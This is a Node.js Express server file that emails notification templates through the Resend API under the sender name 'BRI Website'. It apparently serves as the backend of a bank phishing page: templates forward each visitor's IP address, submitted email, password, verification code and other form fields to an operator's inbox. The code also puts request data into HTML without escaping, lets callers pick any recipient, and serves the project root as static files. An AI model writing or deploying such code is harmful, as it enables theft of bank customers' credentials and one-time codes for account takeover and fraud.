require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Load email template
function getEmailTemplate(templateType, data) {
  const templatePath = path.join(__dirname, 'email-template.html');
  let template = fs.readFileSync(templatePath, 'utf8');
  
  // Extract the specific template
  const templateRegex = new RegExp(`<div id="template-${templateType}"[^>]*>([\\s\\S]*?)</div>`);
  const match = template.match(templateRegex);
  
  if (!match) {
    throw new Error(`Template ${templateType} not found`);
  }
  
  let specificTemplate = match[1];
  
  // Replace placeholders based on template type
  const timestamp = new Date().toISOString();
  
  switch(templateType) {
    case 'website-visit':
      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
      specificTemplate = specificTemplate.replace(/\{\{ip_address\}\}/g, data.ip_address || 'Unknown');
      specificTemplate = specificTemplate.replace(/\{\{website_url\}\}/g, data.website_url || 'http://localhost:3000');
      break;
      
    case 'email-submission':
      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
      specificTemplate = specificTemplate.replace(/\{\{email\}\}/g, data.email || 'Not provided');
      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
      break;
      
    case 'password-submission':
      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
      specificTemplate = specificTemplate.replace(/\{\{password\}\}/g, data.password || 'Not provided');
      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
      break;
      
    case 'verification-code':
      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
      specificTemplate = specificTemplate.replace(/\{\{code\}\}/g, data.code || 'Not provided');
      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
      break;
      
    case 'information-submission':
      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
      specificTemplate = specificTemplate.replace(/\{\{information_array\}\}/g, formatInformationArray(data.information_array));
      specificTemplate = specificTemplate.replace(/\{\{field_count\}\}/g, data.field_count || '0');
      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
      break;
      
    default:
      throw new Error(`Unknown template type: ${templateType}`);
  }
  
  return specificTemplate;
}

// Format information array as HTML table
function formatInformationArray(infoArray) {
  if (!infoArray || !Array.isArray(infoArray)) {
    return '<p style="color: #999; font-size: 13px;">No information provided</p>';
  }
  
  let html = '<table style="width: 100%; border-collapse: collapse;">';
  infoArray.forEach((item, index) => {
    if (typeof item === 'object' && item !== null) {
      const keys = Object.keys(item);
      html += '<tr style="border-bottom: 1px solid #e2e8f0;">';
      keys.forEach(key => {
        html += `<td style="padding: 10px; color: #666; font-size: 13px;"><strong>${key}:</strong></td>`;
        html += `<td style="padding: 10px; color: #333; font-size: 13px;">${item[key]}</td>`;
      });
      html += '</tr>';
    } else {
      html += '<tr style="border-bottom: 1px solid #e2e8f0;">';
      html += `<td style="padding: 10px; color: #666; font-size: 13px;"><strong>Field ${index + 1}:</strong></td>`;
      html += `<td style="padding: 10px; color: #333; font-size: 13px;">${item}</td>`;
      html += '</tr>';
    }
  });
  html += '</table>';
  return html;
}

// Email sending endpoint
app.post('/api/send-email', async (req, res) => {
  try {
    const { templateType, email, subject, data } = req.body;
    
    // Default values if not provided
    const toEmail = email || process.env.DEFAULT_EMAIL || 'contact@example.com';
    const emailSubject = subject || 'BRI Website Notification';
    const template = templateType || 'website-visit';
    const templateData = data || {};

    const htmlContent = getEmailTemplate(template, templateData);

    const emailData = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || 'BRI Website <onboarding@resend.dev>',
      to: [toEmail],
      subject: emailSubject,
      html: htmlContent
    });

    console.log('Email sent successfully:', emailData);
    res.json({ success: true, message: 'Email sent successfully', data: emailData });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, message: 'Error sending email', error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Serve static files
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
